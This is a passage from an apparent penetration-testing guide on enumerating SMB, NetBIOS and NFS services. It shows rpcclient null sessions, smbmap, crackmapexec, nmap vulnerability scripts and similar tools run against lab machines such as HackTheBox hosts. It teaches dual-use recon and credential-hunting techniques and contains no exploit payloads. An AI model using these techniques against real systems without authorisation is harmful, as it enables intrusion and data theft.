<tr>
<td><i class="conum" data-value="4"></i><b>4</b></td>
<td>While nothing is revealed in the SSL certificate here, often some identifying information is present (handy if we didn&#8217;t pick it up during OSINT). We may be able to guess usernames or other fun stuff.</td>
</tr>
<tr>
<td><i class="conum" data-value="5"></i><b>5</b></td>
<td>Again, CUPS 1.1 doesnt seem <em>directly</em> exploitable. Printer hacking is out of the scope of this book, but many resources (<a href="http://hacking-printers.net/wiki/index.php/Main_Page" class="bare">http://hacking-printers.net/wiki/index.php/Main_Page</a> in particular) cover this topic in detail.</td>
</tr>
<tr>
<td><i class="conum" data-value="6"></i><b>6</b></td>
<td>Nmap reports that we don&#8217;t have access to the MySQL DB (i.e. the default username <code>root</code> with no password was refused). We should verify this manually with the <code>mysql</code> client later.</td>
</tr>
<tr>
<td><i class="conum" data-value="7"></i><b>7</b></td>
<td>OS fingerprinting doesn&#8217;t give us much to work with here. Let&#8217;s assume from the Apache banner that the host is running CentOS.</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Running a UDP scan doesn&#8217;t reveal much of interest.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~/VirtualBox VMs/Kioptrix1.1#</span><span class="w"> </span>nmap <span class="nt">-sU</span> 192.168.1.102
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:25 AEDT
Nmap scan report for 192.168.1.102
Host is up (0.00044s latency).
Not shown: 997 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
111/udp open|filtered rpcbind
631/udp open|filtered ipp
MAC Address: 08:00:27:BB:DA:7E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1075.82 seconds</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>This gives us plenty to work with in the next stage of the engagement - investigating individual services.</p>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>There are very few substitutes for practice &amp; experience. Get used to hitting up Boot-2-Root machines, whether we run them ourselves locally, in the cloud, or as part of the many "hacking playground" services available such as OffSec&#8217;s Proving Grounds or HackTheBox.</p>
</div>
<div class="paragraph">
<p>It also doesn&#8217;t hurt to just fiddle around with out-of-the-box OS images to get accustomed to default and non-default behaviour.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_investigating_services">Investigating Services</h2>
<div class="sectionbody">
<div class="paragraph">
<p>At this point we should have a map of most, if not all, of the public facing services running on the victim, along with basic versioning and service specific information. From here, we start to look for common fails, misconfigurations and unpatched vulnerabilities - any way for us to get a foothold on the system.</p>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>One key skill to effectively breaching networks is to spend as little time as possible on "menial" tasks (hence, automation). While we should be exhaustive, <strong>we should be efficient</strong> - looking in the wrong places will eventually drive us to glaze over critical information. We want to place our efforts where they will make a difference - learn how to digest information down to the important details.</p>
</div>
<div class="paragraph">
<p>We should keep track of a priority list of sorts as we enumerate and investigate running services. This list will be informed by experience and intuition - the attack surface of services and how their vulns can be exploited and chained.</p>
</div>
<div class="paragraph">
<p>While we want to collect as much information on the target as possible through tooling and manual recon (for future reference and to turn back to once we exhaust our ideas), we want to follow the path of <strong>least resistance</strong> when attacking the network.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Here are a few common services that provide us with a wealth of information.</p>
</div>
<div class="sect2">
<h3 id="_server_message_block_smb_netbios">Server Message Block (SMB) &amp; NetBIOS</h3>
<div class="paragraph">
<p>Server Message Block (SMB) is a protocol that provides shared access to resources such as files, serial devices, printers and IPC pipes. It is commonly used for file sharing on a network. By default it listens on TCP 445.</p>
</div>
<div class="paragraph">
<p>Interestingly enough, when we have the appropriate credentials, we can often execute commands over SMB. Methods include invoking certain MSRPC functions like console.write or sending an executable over the wire and configuring a service to run it.</p>
</div>
<div class="paragraph">
<p>The SMB protocol has a poor security track record - making it a good target (both for exploitation and recon). It is an especially good target on Windows systems where it is most prevalent.</p>
</div>
<div class="paragraph">
<p>The NetBIOS is an API of sorts that listens on TCP 139 as well as several UDP ports. Note that SMB and NetBIOS are two separate protocols. NetBIOS is a session layer "protocol" and service that allows computers on a LAN to communicate with each other.
While modern SMB works without NetBIOS, NetBIOS over TCP (NBT) is required for backward compatibility and is often enabled together. So usually, enumeration of these services is intertwined.</p>
</div>
<div class="paragraph">
<p>The primary low-level tools for directly interacting with SMB &amp; NetBIOS will come from the Samba suite (an open source implementation of the SMB protocol), such as <code>smbclient</code> and <code>nmblookup</code>.</p>
</div>
<div class="paragraph">
<p>The impacket library (<a href="https://github.com/SecureAuthCorp/impacket" class="bare">https://github.com/SecureAuthCorp/impacket</a>), a suite of Python classes &amp; tools for networking protocols, also has a number of helpful SMB scripts such as <code>impacket-smbserver</code>, helpful in hosting a temporary SMB instance for file transfer to and from Windows machines.</p>
</div>
<div class="paragraph">
<p>Additional tooling and custom scripts we write will usually be built upon these foundations.</p>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Where possible, when we automate our recon tooling we want to run a number of similar tools for redundancy. This helps ensure that the collective output covers any individual quirks/errors and feature gaps.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect3">
<h4 id="_rpcclient">rpcclient</h4>
<div class="paragraph">
<p><code>rpcclient</code> is a tool from the Samba suite that can be used to manage NT clients from UNIX. We employ it for its ability to interact with SMB on a low level.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">rpcclient -U "username%password" &lt;IP&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We should always check whether null sessions are allowed. A null session occurs when we access a resource hosted by SMB (usually the IPC$ named pipe share) without authentication - effectively allowing anonymous access. We do this by explicity setting a NULL user and password when we connect.</p>
</div>
<div class="paragraph">
<p>To do this with rpcclient, we specify an empty string for the username and invoke the no password switch.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">rpcclient -U "" -N &lt;IP&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Once we are connected, we are presented with an interactive prompt where we can run MS-RPC functionality.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.10.10.3
<span class="gp">rpcclient $</span><span class="o">&gt;</span> enumdomusers
<span class="go">user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
</span><span class="c">...</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Useful commands to run on the interactive prompt include <code>netshareenum</code>, <code>netshareenumall</code>, <code>enumdomusers</code>, <code>enumdomgroups</code>, <code>querygroup &lt;RID&gt;</code>, <code>querygroupmem &lt;RID&gt;</code> and <code>queryuser &lt;RID&gt;</code>, all of which are fairly self explanatory.</p>
</div>
<div class="paragraph">
<p><code>getdompwinfo</code> provides the domain&#8217;s password policy, which is helpful when planning bruteforce attacks or password sprays.</p>
</div>
</div>
<div class="sect3">
<h4 id="_smbclient">smbclient</h4>
<div class="paragraph">
<p><code>smbclient</code> is a client to access SMB shares on servers. It offers an interface that is similar to traditional Unix FTP clients.</p>
</div>
<div class="paragraph">
<p>We can list the shares on a host with the <code>-L</code> flag. Often SMB servers will allow a "null session" (sending an empty password).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">smbclient -L &lt;HOST&gt;</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>smbclient <span class="nt">-L</span> 192.168.1.5
<span class="go">Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
</span><span class="gp">        IPC$</span><span class="w">            </span>Disk
<span class="go">        PRIVATE_SHARE   Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.5 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can then access shares with the interactive client.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">smbclient //&lt;IP&gt;</span>/&lt;SHARE NAME&gt;</code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>smbclient //192.168.1.5/PRIVATE_SHARE
<span class="go">Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">  .                                   D     4096  Sun Mar 21 18:12:18 2021
  ..                                  D    45056  Sun Mar 21 18:11:14 2021
  tax.odf                            AN      516  Sun Mar 21 18:12:18 2021

                148529400 blocks of size 7680. 148529400 blocks available
</span><span class="gp">smb: \&gt;</span><span class="w"> </span>get tax.odf
<span class="go">getting file \tax.odf of size 516 as tax.odf (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
</span><span class="gp">smb: \&gt;</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can specify credentials with the <code>-U</code> flag in the following format: <code>username%password</code>.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Some servers will require SMB1 support. This can be enabled by adding the following entry to the smb.conf file (usually located at <code>/etc/samba/smb.conf</code>)</p>
</div>
<div class="paragraph">
<p><code>client min protocol = NT1</code></p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect3">
<h4 id="_smbmap">smbmap</h4>
<div class="paragraph">
<p><code>smbmap</code> is an SMB utility designed with penetration testing in mind. We specify a host with <code>-H &lt;HOST&gt;</code> then enable one or more switches:</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Switch</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-P</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify the SMB port (default 445).</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-u</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify a username.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-p</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify a password.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-d</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Specify domain name (defaults to WORKGROUP).</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-L</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">List all share drives on the host. Default behaviour.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-R [PATH]</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Recursively list directories and files in the path. Not specifying a path recursively crawls all shares.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-r [PATH]</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Same as above, but non recursive.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-A &lt;PATTERN&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Download all files that match a regex pattern. Useful for grabbing secrets &amp; configs across a large network.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-x &lt;COMMAND&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Executes a command over SMB.</p></td>
</tr>
</tbody>
</table>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>smbmap <span class="nt">-H</span> 10.10.10.3
<span class="go">[+] IP: 10.10.10.3:445  Name: 10.10.10.3
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
</span><span class="gp">        print$</span><span class="w">                                                  </span>NO ACCESS       Printer Drivers
<span class="go">        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
</span><span class="gp">        IPC$</span><span class="w">                                                    </span>NO ACCESS       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
<span class="gp">        ADMIN$</span><span class="w">                                                  </span>NO ACCESS       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">)</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_nmblookup">nmblookup</h4>
<div class="paragraph">
<p>A part of the Samba suite, <code>nmblookup</code> queries NetBIOS names (a 16 byte machine name) and maps them to IP addresses (we can also do the reverse - IP to machine name). We use this to enumerate the hostname of a machine.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>nmblookup <span class="nt">-A</span> 10.11.1.231
<span class="c">...
</span><span class="go">Looking up status of 10.11.1.231
</span><span class="gp">        MAILMAN         &lt;00&gt;</span><span class="w"> </span>-         B &lt;ACTIVE&gt;  Workstation Service
<span class="gp">        MAILMAN         &lt;03&gt;</span><span class="w"> </span>-         B &lt;ACTIVE&gt;  Messenger Service
<span class="gp">        MAILMAN         &lt;20&gt;</span><span class="w"> </span>-         B &lt;ACTIVE&gt;  File Server Service
<span class="gp">        ..__MSBROWSE__. &lt;01&gt;</span><span class="w"> </span>- &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
<span class="gp">        SECURITY        &lt;00&gt;</span><span class="w"> </span>- &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
<span class="gp">        SECURITY        &lt;1d&gt;</span><span class="w"> </span>-         B &lt;ACTIVE&gt;  Master Browser
<span class="gp">        SECURITY        &lt;1e&gt;</span><span class="w"> </span>- &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
<span class="go">
        MAC Address = 00-00-00-00-00-00
</span><span class="c">...</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_enum4linux">enum4linux</h4>
<div class="paragraph">
<p><code>enum4linux</code> is a perl wrapper around <code>smbclient</code>, <code>net</code> and <code>nmblookup</code> that is frequently used to do a full spectrum enumeration of SMB, but is difficult to use without manual patching due to a lack of maintenance. (e.g. The $global_workgroup is never initialized to a default value, resulting in mangled output). Alternatives include enum4linux-ng (<a href="https://github.com/cddmp/enum4linux-ng" class="bare">https://github.com/cddmp/enum4linux-ng</a>).</p>
</div>
</div>
<div class="sect3">
<h4 id="_nse_scripts">NSE Scripts</h4>
<div class="paragraph">
<p>Nmap sports the <code>smb-enum-shares</code> and <code>smb-os-discovery</code> scripts which are helpful when enumerating SMB.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>nmap <span class="nt">-p</span> 139,445 <span class="nt">--script</span> smb-enum-shares 10.10.10.3
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 21:25 AEDT
Nmap scan report for 10.10.10.3
Host is up (0.026s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
</span><span class="gp">|   account_used: &lt;blank&gt;</span><span class="w">
</span><span class="gp">|   \\10.10.10.3\ADMIN$</span>:
<span class="go">|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\tmp
</span><span class="gp">|     Anonymous access: &lt;none&gt;</span><span class="w">
</span><span class="gp">|   \\10.10.10.3\IPC$</span>:
<span class="go">|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
</span><span class="gp">|     Max Users: &lt;unlimited&gt;</span><span class="w">
</span><span class="go">|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.10.10.3\opt:
|     Type: STYPE_DISKTREE
|     Comment:
</span><span class="c">...</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>nmap <span class="nt">-p</span> 139,445 <span class="nt">--script</span> smb-os-discovery 10.10.10.3
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 02:43 AEDT
Nmap scan report for 10.10.10.3
Host is up (0.018s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-03-22T11:42:44-04:00

Nmap done: 1 IP address (1 host up) scanned in 2.74 seconds</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can also take advantage of Nmap&#8217;s rudimentary vulnerability scanning scripts to check for any major vulnerabilities (like EternalBlue).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">nmap --script smb-vuln* -p 139,445 10.11.24.1
</span><span class="c">...
</span><span class="go">| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|\_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
</span><span class="c">...</span></code></pre>
</div>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>The SMB protocol is victim to a number of high impact vulnerabilities with public weaponised exploits. Always check the version of SMB against an exploit database (although we should be doing this for all services we encounter).</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Check the SMB sub-directory of the NSE folder for more scripts. (usually located at <code>/usr/share/nmap/scripts/smb</code>)</p>
</div>
</div>
<div class="sect3">
<h4 id="_nbtscan">nbtscan</h4>
<div class="paragraph">
<p><code>nbtscan</code> is a tool for scanning networks for NetBIOS name info - mostly useful for grabbing the NetBIOS names of machines on a network.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">nbtscan &lt;IP/IP RANGE&gt;</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_ridenum">ridenum</h4>
<div class="paragraph">
<p><code>ridenum</code> is a tool that automates RID cycling to enumerate usernames - an attack where we append an incrementing RID to a domain SID (a Security Identifier is a <strong>unique</strong> variable length string that starts with "S" that is used to identify anything that can authenticate in a Windows network) and checks its validity. The RID - relative identifier - is simply a variable length number that forms the last part of the SID and is used to denote a specific object in a domain.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">ridenum &lt;IP&gt;</span><span class="w"> </span>&lt;START RID&gt; &lt;END RID&gt; <span class="o">[</span>USERNAME] <span class="o">[</span>PASSWORD]</code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_crackmapexec">crackmapexec</h4>
<div class="paragraph">
<p><code>crackmapexec</code> is a post-exploitation tool used to automate assessment of Active Directory, handy when pivoting internally in a large network. It is primarily built upon the Impacket library.</p>
</div>
<div class="paragraph">
<p><code>crackmapexec</code> supports a wide range of functionality for SMB, SSH, WINRM and MSSQL - here we will touch upon a small section of its SMB features. A full command reference is available here <a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference" class="bare">https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference</a>.</p>
</div>
<div class="paragraph">
<p>The basic <code>crackmapexec</code> SMB syntax is as follows:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">crackmapexec smb &lt;IP/IP RANGE&gt;</span><span class="w"> </span><span class="o">[</span><span class="nt">-u</span> USERNAME] <span class="o">[</span><span class="nt">-p</span> <span class="s1">'PASSWORD'</span><span class="o">]</span> <span class="o">[</span>ADDITIONAL SWITCHES]</code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>crackmapexec smb 10.10.10.3
<span class="go">SMB         10.10.10.3      445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>We can enumerate shares, sessions, disks and users using self descriptive switches.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Switch</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--shares</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate shares.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--sessions</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate sessions.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--disks</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate disks.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--loggedon-users</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate logged on users.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--users</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate domain users.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--rid-brute</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Try to enumerate users through RID Cycling.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--groups</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate domain groups.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--local-groups</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Enumerate groups local to the machine.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>--pass-pol</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Grab the domain password policy.</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p><code>crackmapexec</code> also supports share spidering (with use of a pattern) and command execution (through three methods with fallback on each other).</p>
</div>
</div>
<div class="sect3">
<h4 id="_note_on_fingerprinting_version">Note on Fingerprinting Version</h4>
<div class="paragraph">
<p>Experience has found that tools may be unreliable to trying to fingerprint the running version of Samba servers. In these cases, it may be helpful to initiate a connection (e.g. using smbclient) and inspecting the packets sent by the server using <code>tcpdump</code>, <code>wireshark</code>, <code>ngrep</code> or otherwise.</p>
</div>
<div class="paragraph">
<p>For example, we can listen on the appropriate interface using <code>ngrep</code> with a match pattern, then intiate a connection with smbclient.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">ngrep -i -d &lt;INTERFACE&gt;</span><span class="w"> </span><span class="s1">'s.?a.?m.?b.?a.*[[:digit:]]'</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>ngrep <span class="nt">-i</span> <span class="nt">-d</span> tun0 <span class="s1">'s.?a.?m.?b.?a.*[[:digit:]]'</span>
<span class="go">interface: tun0 (10.10.14.0/255.255.254.0)
filter: (ip || ip6)
match: s.?a.?m.?b.?a.*[[:digit:]]
</span><span class="gp">#</span><span class="c">###########</span>
<span class="gp">T 10.10.10.3:445 -&gt;</span><span class="w"> </span>10.10.14.8:54436 <span class="o">[</span>AP] <span class="c">#12</span>
<span class="go">  ...*.SMBs.......................d.................0...
  ........+.....7.........NTLMSSP.........0......`....i.
  ..........b.b.8...L.A.M.E.....L.A.M.E.....L.A.M.E.....
</span><span class="gp">  h.a.c.k.t.h.e.b.o.x...g.r...$</span>.l.a.m.e...h.a.c.k.t.h.e.
<span class="go">  b.o.x...g.r.....U.n.i.x...S.a.m.b.a. .3...0...2.0.-.D.
  e.b.i.a.n...W.O.R.K.G.R.O.U.P...</span></code></pre>
</div>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<i class="fa icon-note" title="Note"></i>
</td>
<td class="content">
<div class="paragraph">
<p>This is just a small subset of the available tools for investigating SMB (additionally, only a small slice of features have been shown - <strong>RTFM</strong>, man pages are your best friend). For all services, we should find (or create) a tooling workflow we are comfortable with - we should always be on the lookout for new techniques and tools and take the time to create our own (both to give back to the community and to better understand what we are attacking).</p>
</div>
<div class="paragraph">
<p>Keep up with changing technology stacks and ways to break them - a good low effort baseline is tuning into security podcasts and news aggregators every now and then.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_network_file_system_nfs">Network File System (NFS)</h3>
<div class="paragraph">
<p>NFS is a distributed file system protocol that allows file access within a network as if the file resided on a local drive. NFS is often used with nix systems and is difficult to harden, making it a good target.</p>
</div>
<div class="paragraph">
<p>We should check NFS servers to see if any sensitive files can be read (web configs, database files, internal documents) or if we can write to sensitive locations (like a web root).</p>
</div>
<div class="paragraph">
<p>By default, NFS servers listen on TCP 2049 but also require TCP 111 to be open for a portmapper/rpcbind service.</p>
</div>
<div class="sect3">
<h4 id="_showmount">showmount</h4>
<div class="paragraph">
<p><code>showmount</code> is a utility to show mount information for an NFS server. When run against a host without switches (e.g. <code>showmount &lt;IP&gt;</code>) it simply lists clients that are mounting shares from the host.</p>
</div>
<div class="paragraph">
<p>We are usually interested in the shares exported by the server, which we can check as follows:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">showmount -e &lt;IP&gt;</span></code></pre>
</div>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>showmount <span class="nt">-e</span> 10.10.10.180
<span class="go">Export list for 10.10.10.180:
/site_backups (everyone)</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_nse_scripts_2">NSE Scripts</h4>
<div class="paragraph">
<p>Nmap comes with three handy NFS NSE scripts.</p>
</div>
<div class="ulist">
<ul>
<li>
<p><code>nfs-ls</code> lists files in NFS exports and their permissions.</p>
</li>
<li>
<p><code>nfs-showmount</code> is equivalent to running <code>showmount -e</code> (showing NFS exports).</p>
</li>
<li>
<p><code>nfs-statfs</code> retrieves disk statistics of NFS shares.</p>
</li>
</ul>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>nmap <span class="nt">--script</span><span class="o">=</span>nfs-ls,nfs-showmount,nfs-statfs <span class="nt">-p</span> 111 10.10.10.180
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 23:46 AEDT
Nmap scan report for 10.10.10.180
Host is up (0.013s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /site_backups
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  4096   2020-02-23T18:35:48  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
| rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
| rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
| rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
| rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
| rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
|_
| nfs-showmount:
|_  /site_backups
| nfs-statfs:
|   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
